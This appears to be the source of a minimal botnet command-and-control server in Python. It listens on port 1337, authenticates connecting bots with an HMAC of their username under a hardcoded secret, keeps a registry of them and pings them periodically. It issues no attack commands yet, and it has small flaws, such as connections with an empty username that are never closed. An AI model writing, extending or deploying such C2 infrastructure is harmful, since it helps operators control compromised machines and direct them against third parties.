#!/usr/bin/env python3
import socket
import threading
import time
import base64
import hmac
import hashlib

HOST = '0.0.0.0'
PORT = 1337
BOT_SECRET = base64.b64decode("kZPUbHYdNYRDXBjbR4SeWvUfvD5Sc90wMrC8XGa2Z54=")
bots = {}
lock = threading.Lock()

def bot_handler(client, addr, arch):
    print(f"[+] Bot connected: {arch}")
    while True:
        try:
            client.send(b"PING\n")
            time.sleep(10)
        except:
            break
    with lock:
        if arch in bots:
            del bots[arch]
    client.close()
    print(f"[-] Bot disconnected: {arch}")

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(10)
    print(f"[*] C2 running on {HOST}:{PORT}")
    
    while True:
        client, addr = server.accept()
        try:
            username = client.recv(1024).decode().strip()
            if not username:
                continue
            client.send(b"Password: ")
            password = client.recv(1024).decode().strip()
            expected = hmac.new(BOT_SECRET, username.encode(), hashlib.sha256).hexdigest()
            if password == expected:
                print(f"[+] Auth OK: {username}")
                with lock:
                    bots[username] = client
                threading.Thread(target=bot_handler, args=(client, addr, username), daemon=True).start()
            else:
                print(f"[-] Auth FAIL: {username}")
                client.close()
        except:
            client.close()

if __name__ == "__main__":
    main()
